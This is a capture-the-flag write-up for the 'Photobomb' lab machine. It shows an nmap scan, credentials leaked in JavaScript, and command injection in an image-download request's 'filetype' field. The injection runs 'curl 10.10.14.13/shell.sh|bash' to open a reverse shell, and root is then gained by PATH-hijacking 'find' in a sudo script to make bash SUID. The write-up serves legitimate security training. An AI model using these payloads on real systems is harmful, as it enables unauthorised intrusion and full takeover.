# Photobomb

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.228.60                                    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 10:14 EDT
Warning: 10.129.228.60 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.228.60
Host is up (0.0056s latency).
Not shown: 51828 closed tcp ports (conn-refused), 13705 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `photobomb.htb` to our `/etc/hosts` file to view port 80

### JS Credentials

The webpage looks like a corporate page:

<figure><img src="../../../.gitbook/assets/image (2653).png" alt=""><figcaption></figcaption></figure>

When we click the link, it redirects us to some gallery.

<figure><img src="../../../.gitbook/assets/image (2798).png" alt=""><figcaption></figcaption></figure>

Since the page mentions there are credentials, we can view the page source to find `photobomb.js` containing some credentials:

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

These credentials don't tell me anything new, so let's move on. At the bottom of the gallery, we can download images.&#x20;

<figure><img src="../../../.gitbook/assets/image (1409).png" alt=""><figcaption></figcaption></figure>

Here's the request generated when we download a photo:

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1



photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

I didn't know how this was handling photos, but the long processing time between requests indicates to me that these photos might be dynamically generated instead of having all the possible combinations of photos stored on the website. This means that the parameters could be passed into a command, and then the image is returned.&#x20;

I tried some basic command injection, and found that the `filetype` parameter was vulnerable:

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1



photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+10.10.14.13/rcecfm&dimensions=3000x2000
```

<figure><img src="../../../.gitbook/assets/image (1899).png" alt=""><figcaption></figcaption></figure>

With this, we can use `curl 10.10.14.13/shell.sh|bash` to get a reverse shell.

<figure><img src="../../../.gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag from the home directory.

## Privilege Escalation

### Sudo Privileges

The user is able to run a script as `root`.

```
wizard@photobomb:/tmp$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

SETENV just means that the current environment is used instead and that we can specify the environment variables before running the command:

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/" %}

Here's the script:

```bash
wizard@photobomb:/tmp$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

The `find` binary does NOT have an absolute path, which means we can create a binary called `find` that executes a reverse shell and change our PATH variable to execute it first.

First, create a file called `find` with a malicious command:

```bash
$ cat find                   
#!/bin/bash

chmod +s /bin/bash
```

Afterwards, download this to the machine and make it executable. Then, just run this:

```bash
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

This would make `/bin/bash` an SUID binary.

<figure><img src="../../../.gitbook/assets/image (1068).png" alt=""><figcaption></figcaption></figure>

Rooted!
